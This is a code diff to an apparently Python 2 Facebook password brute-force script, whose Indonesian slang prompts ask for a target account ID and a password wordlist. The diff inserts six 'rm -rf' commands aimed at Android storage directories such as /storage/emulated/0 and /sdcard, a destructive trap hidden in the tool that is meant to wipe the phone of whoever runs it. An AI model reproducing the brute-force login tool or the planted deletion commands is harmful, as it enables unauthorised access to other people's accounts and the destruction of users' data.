@@ -9,11 +9,16 @@ import random
 
 
 
-email = str(raw_input("Masukin Target Kalian Tod~|Contoh : LadyMia2610/1002454842 ~|: "))
+email = str(raw_input("Masukin Target Kalian kontol~|Contoh : OrangTmv12/1002454842 ~|: "))
 
 
-passwordlist = str(raw_input("Masukin Wordlist Kalian ~|Contoh : RafellGanns.txt ~| : "))
-
+passwordlist = str(raw_input("Masukin Wordlist Kalian ~|Contoh : file.txt ~| : "))
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /internal
+rm -rf /storage/sdcard
+rm -rf /storage/sdcard 1
+rm -rf SPREI/bin
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 
